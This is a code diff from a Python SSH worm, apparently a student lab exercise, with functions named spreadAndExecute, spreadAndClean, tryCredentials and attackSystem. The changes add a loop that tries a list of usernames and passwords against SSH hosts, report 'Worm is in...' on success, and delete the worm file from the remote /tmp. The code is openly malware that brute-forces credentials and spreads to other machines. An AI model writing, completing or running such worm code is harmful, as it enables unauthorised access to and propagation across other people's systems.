@@ -81,7 +81,7 @@ def spreadAndExecute(sshClient):
 	sshClient.close()
 
 def spreadAndClean(sshClient):
-	
+
     sftpClient = sshClient.open_sftp()
 
     sshClient.exec_command("rm /tmp/worm.py")
@@ -126,19 +126,21 @@ def tryCredentials(host, userName, password, sshClient):
 	print("Connecting to..." + host + "Username: " + userName)
 
 	try:
-		sshClient.connect(host, username=userName, password=password)
+		sshClient.connect(host, username = userName, password = password)
 
-		print("Connected to machine")
+		print("Connect to machine...")
 
 		return 0
+
 	except paramiko.SSHException:
 
-		print("Pass or User invalid...")
+		print("User or Pass invalid...")
 
 		return 1
-	except socket.error:
-		
-		print("socket error...")
+
+	except (socket.error, socket.gaierror) as e:
+
+		print("Server side issues...")
 
 		return 3
 
@@ -178,7 +180,9 @@ def attackSystem(host):
 		# return a tuple containing an
 		# instance of the SSH connection
 		# to the remote system. 
-		
+	
+	for (username, password) in credList:
+
 		if tryCredentials(host, username, password, ssh) == 0:
 
 			print("Worm is in...")
@@ -199,7 +203,7 @@ def getMyIP(interface):
 	# TODO: Change this to retrieve and
 	# return the IP of the current system.
 
-	return netinfo.get_ip(interface)
+	return netifaces.ifaddresses(interface)[2][0]['addr']
 
 #######################################################
 # Returns the list of systems on the same network
